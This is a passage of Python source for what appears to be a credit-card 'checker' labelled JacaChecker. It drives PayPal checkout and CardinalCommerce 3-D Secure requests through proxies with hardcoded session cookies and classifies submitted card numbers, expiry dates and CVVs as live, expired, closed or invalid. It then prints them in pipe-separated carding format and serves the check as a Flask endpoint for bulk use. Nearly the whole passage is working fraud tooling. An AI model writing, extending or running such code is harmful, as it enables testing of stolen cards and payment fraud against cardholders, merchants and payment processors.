                'Cookie': f'cookie_check=yes; d_id=d235792b9c2a4780811690d99e08b0a61715658714954; cookie_prefs=T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner; KHcl0EuY7AKSMgfvHl7J5E7hPtK=IyYas113zKGxOqzwgBfkQt3zS1qYm69fmtUTSa2em3avgYnWnrWnEbGquQOleKDWQH7XApAjtad0FOnW; nsid=s%3AbEzMme3e80J9aAJ6am4xzVVR1ZRk3X1B.RNpKf1eQYAQAjWh62%2B2lZOQyW2POLsvJWOlOObb7yCM; sc_f=TSEhqEOt4JrCfR--8egw5EsVogeGvmbSRG4ySzyRviuoFcnu5CfCs4cvf50Lm05mRTiP6e2MuMXZbHzJi29TLig1VLlnAyTdV9W3yG; enforce_policy=ccpa; LANG=pt_PT%3BPT; x-pp-s=eyJ0IjoiMTcyMTE0MTA3OTgyMyIsImwiOiIwIiwibSI6IjAifQ; x-csrf-jwt={xcsrfjwt_cookies}; tsrce=heliosnodeweb; l7_az=dcg16.slc; ts_c=vr%3D2700a75418f0a89921410487fb330673%26vt%3Dbd91d5db1900a550503a0730ffb43062; ts=vreXpYrS%3D1815775370%26vteXpYrS%3D1721169170%26vr%3D2700a75418f0a89921410487fb330673%26vt%3Dbd91d5db1900a550503a0730ffb43062%26vtyp%3Dreturn',
                'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                'sec-ch-ua-mobile': '?0',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
                'accept': '*/*',
                'x-csrf-jwt': f'{xcsrfjwt}',
                'x-requested-with': 'XMLHttpRequest',
                'x-cookies': '{}',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': f'https://www.paypal.com/webapps/helios?action=verify&xcomponent=1&flow=3ds&cart_id={order_id}&client_id={client_id}&sdkMeta={sdkmeta}',
                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'priority': 'u=1, i'
                }
                response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p)
                reference_id = response.json()['data']['threeDSPayerAction']['three_ds_contingency_context']['reference_id']
                number_encrypted = response.json()['data']['threeDSPayerAction']['payment_card']['number_encrypted']
                idcc = response.json()['data']['threeDSPayerAction']['payment_card']['id']
                
                
                
                url = "https://www.paypal.com/webapps/helios/api/switch/threeDSLookUp"
                payload = {
                    "data": {
                        "lookUpPayload": {
                            "threeDSReferenceId": reference_id,
                            "flowId": "HERMES",
                            "billingAddress": {
                                "line1": f"{snumber} {street}",
                                "line2": "",
                                "city": city,
                                "state": state,
                                "givenName": nome,
                                "familyName": sobrenome,
                                "country": "US",
                                "postalCode": postcode
                            },
                            "encryptedCardNumber": number_encrypted,
                            "creditCardId": idcc,
                            "expirationMonth": month,
                            "expirationYear": year,
                            "cardTransactionCharacteristics": "PRE_AUTH",
                            "threeDSContingencySource": "PAYMENT_CONTEXT",
                            "threeDSContingencyReason": "MERCHANT_REQUESTED",
                            "merchantCategoryCode": "5621",
                            "unbrandedPaymentIndicator": True
                        },
                        "amount": {
                            "currencyCode": "EUR",
                            "currencyValue": "30.00"
                        },
                        "browserInfo": {
                            "windowSize": "_500_x_600",
                            "javaEnabled": False,
                            "language": "pt",
                            "colorDepth": 24,
                            "screenHeight": 510,
                            "screenWidth": 450,
                            "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
                            "timeZoneOffset": 180
                        },
                        "logResolve": {
                            "flow": "UCC",
                            "is_enabled": True,
                            "pid": account1,
                            "mid": account2
                        },
                        "productDetails": {
                            "productCode": "DIRECT_CREDIT_CARD",
                            "productFeature": "PAYPAL_COMPLETE_PAYMENTS",
                            "userExperienceFlow": "INCONTEXT"
                        },
                        "partnerDetails": {
                            "businessInformation": {
                                "businessTaggingId": "PrestaShop_c7e64e89ef79c1a238f49792183bdd6d",
                                "businessName": "PrestaShop Checkout"
                            },
                            "accountNumber": account1
                        },
                        "traRiskDetails": {},
                        "allowRetry": False
                    },
                    "meta": {
                        "token": order_id,
                        "cartId": order_id,
                        "calc": "e4bcaf001db69",
                        "csci": "8ccce44cff404cb185323666864d8e05",
                        "locale": {
                            "country": "US",
                            "language": "en"
                        },
                        "state": "ui_checkout_threeDsV2",
                        "action": "verify",
                        "flow": "3ds",
                        "app_name": "heliosnodeweb"
                    }
                }

                headers = {
                'Host': 'www.paypal.com',
                'Cookie': f'cookie_check=yes; d_id=d235792b9c2a4780811690d99e08b0a61715658714954; cookie_prefs=T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner; KHcl0EuY7AKSMgfvHl7J5E7hPtK=IyYas113zKGxOqzwgBfkQt3zS1qYm69fmtUTSa2em3avgYnWnrWnEbGquQOleKDWQH7XApAjtad0FOnW; LANG=en_US%3BUS; nsid=s%3AbEzMme3e80J9aAJ6am4xzVVR1ZRk3X1B.RNpKf1eQYAQAjWh62%2B2lZOQyW2POLsvJWOlOObb7yCM; sc_f=TSEhqEOt4JrCfR--8egw5EsVogeGvmbSRG4ySzyRviuoFcnu5CfCs4cvf50Lm05mRTiP6e2MuMXZbHzJi29TLig1VLlnAyTdV9W3yG; enforce_policy=ccpa; ts_c=vr%3D2700a75418f0a89921410487fb330673%26vt%3Db956135b1900aa58f8215f14fbd67ebf; l7_az=dcg15.slc; tsrce=privacynodeweb; ts=vreXpYrS%3D1815707405%26vteXpYrS%3D1721101205%26vr%3D2700a75418f0a89921410487fb330673%26vt%3Db956135b1900aa58f8215f14fbd67ebf%26vtyp%3Dreturn; x-pp-s=eyJ0IjoiMTcyMTA5OTQwNTI2NSIsImwiOiIwIiwibSI6IjAifQ; x-csrf-jwt={xcsrfjwt_cookies}',
                'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                'sec-ch-ua-mobile': '?0',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
                'content-type': 'application/json;charset=UTF-8',
                'accept': '*/*',
                'x-csrf-jwt': xcsrfjwt,
                'x-requested-with': 'XMLHttpRequest',
                'x-cookies': '{}',
                'sec-ch-ua-platform': '"Windows"',
                'origin': 'https://www.paypal.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': f'https://www.paypal.com/webapps/helios?action=verify&xcomponent=1&flow=3ds&cart_id={order_id}&@client_id={client_id}&sdkMeta={sdkmeta}',
                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'priority': 'u=1, i'
                }

                response = requests.request("POST", url, headers=headers, json=payload, verify=False, proxies=p)
                if 'paymentAuthenticationRequest' in response.text:
                    creq = response.json()['data']['paymentAuthenticationRequest']           
                                
                    url = "https://authentication.cardinalcommerce.com/ThreeDSecure/V2_1_0/CReq"

                    payload = f"creq={creq}"
                    headers = {
                    'Host': 'authentication.cardinalcommerce.com',
                    'Cookie': '__cfruid=b20519ce633f6c86753ff48ce0815053068bd539-1721093408',
                    'cache-control': 'max-age=0',
                    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'upgrade-insecure-requests': '1',
                    'origin': 'https://centinelapi.cardinalcommerce.com',
                    'content-type': 'application/x-www-form-urlencoded',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'sec-fetch-site': 'same-site',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-dest': 'iframe',
                    'referer': 'https://centinelapi.cardinalcommerce.com/',
                    'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                    'priority': 'u=0, i'
                    }

                    r = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
                            
                    if 'autorizando' in r.text:
                        saldousdo = bot(c1, month, year, cvv)
                        return {"code": saldousdo["codee"], "mensagem": saldousdo["mensageme"]}
                        
                    elif 'SMS' in r.text:
                        saldousdo = bot(c1, month, year, cvv)
                        return {"code": saldousdo["codee"], "mensagem": saldousdo["mensageme"]}
                                                    
                    elif 'S88' in r.text:
                        saldousdo = bot(c1, month, year, cvv)
                        return {"code": saldousdo["codee"], "mensagem": saldousdo["mensageme"]}
                    
                    elif 'TAA BB' in r.text:
                        saldousdo = bot(c1, month, year, cvv)
                        return {"code": saldousdo["codee"], "mensagem": saldousdo["mensageme"]}
                    
                    elif 'BB' in r.text:
                        saldousdo = bot(c1, month, year, cvv)
                        return {"code": saldousdo["codee"], "mensagem": saldousdo["mensageme"]}
                    
                    elif '361' in r.text:
                        saldousdo = bot(c1, month, year, cvv)
                        return {"code": saldousdo["codee"], "mensagem": saldousdo["mensageme"]}
                    
                    elif 'passcode' in r.text:
                        saldousdo = bot(c1, month, year, cvv)
                        return {"code": saldousdo["codee"], "mensagem": saldousdo["mensageme"]}
                        
                        
                        
                    elif 'S61' in r.text:
                        info = bins(c1[:6])                    
                        x = f"{c1}|{month}|{year}|{cvv}| {info} - CLOSED"                
                        print(Fore.RED + f"{x} #JacaChecker")   
                        return {"code":2 , "mensagem": f"{x}\n"}  
                                        
                    elif '351-Falha' in r.text:
                        info = bins(c1[:6])                    
                        x = f"{c1}|{month}|{year}|{cvv}| {info} - EXPIRED CARD"                
                        print(Fore.RED + f"{x} #JacaChecker") 
                        return {"code":2 , "mensagem": f"{x}\n"}         
                                
                    elif 'Endereco Email Null' in r.text:
                        info = bins(c1[:6])                    
                        x = f"{c1}|{month}|{year}|{cvv}| {info} - SAFRA RECUSED"                
                        print(Fore.RED + f"{x} #JacaChecker") 
                        return {"code":2 , "mensagem": f"{x}\n"}  
                
                    elif 'S51' in r.text:
                        info = bins(c1[:6])                
                        x = f"{c1}|{month}|{year}|{cvv}| {info} - EXPIRED CARD"                         
                        print(Fore.RED + f"{x} #JacaChecker")     
                        return {"code":2 , "mensagem": f"{x}\n"}  
                    
                                            
                    elif 'There was an error processing your request' in r.text:  
                        info = bins(c1[:6])
                        x = f"{c1}|{month}|{year}|{cvv}| {info} - INVALID CARD" 
                        print(Fore.RED + f"{x} #JacaChecker") 
                        return {"code":2 , "mensagem": f"{x}\n"}     
                     
                    elif 'cres' in r.text:  
                        info = bins(c1[:6])
                        x = f"{c1}|{month}|{year}|{cvv}| {info} - Status: INVALID CARD"      
                        print(Fore.RED + f"{x} #JacaChecker")     
                        return {"code":2 , "mensagem": f"{x}\n"}                               
                    else:
                        print(Fore.RED + 'Gateway Timeout' + r.text)
                        return {"code":2 , "mensagem": f"{x}\n"}    
                        
            elif 'UNPROCESSABLE_ENTITY' in response.text:
                    info = bins(c1[:6])
                    x = f"{c1}|{month}|{year}|{cvv}| {info} - Status: UNPROCESSABLE"      
                    print(Fore.RED + f"{x} #JacaChecker")
                    return {"code":2 , "mensagem": f"{x}\n"}   

            else:
                    print(Fore.RED + 'Contate ADM se persistir !')
                    return {"code":2 , "mensagem": f"{x}\n"}   
        
    except requests.exceptions.ProxyError:
        ret(c1, month, year, cvv)
    except requests.exceptions.ConnectionError:
        ret(c1, month, year, cvv)
    except requests.exceptions.RequestException:
        ret(c1, month, year, cvv)
    # except EtokenInvalido:
    #     ret(c1, month, year, cvv)

            


# Função para processar cartões
def processar_cartoes(card, mes, ano, cvv):
    try:
        if (len(card) == 16 or len(card) == 15) and mes and ano and cvv:
            retorno = verify(card, mes, ano, cvv)
            return {"code": retorno["code"], "retorno": retorno["mensagem"]}
        else:
            return {"code": "", "retorno": "Erro no formulário"}
    except Exception as e:
        return {"code": "", "retorno": f"Exception: {str(e)}"}

# Endpoint para iniciar o serviço
@app.route('/', methods=['GET'])
def iniciarChk():
    return "@Engenieiro"

# Endpoint para checar os cartões
@app.route('/chk', methods=['GET'])
def chk():
    args = request.args
    card = args.get('card')
    mes = args.get('mes')
    ano = args.get('ano')
    cvv = args.get('cvv')
    
    # Usar executor de threads para processar o cartão
    with concurrent.futures.ThreadPoolExecutor() as executor:
        future = executor.submit(processar_cartoes, card, mes, ano, cvv)
        result = future.result()
    
    return jsonify(result)

if __name__ == '__main__':
    app.run(host='localhost', port=5000, debug=True)
    
    
    

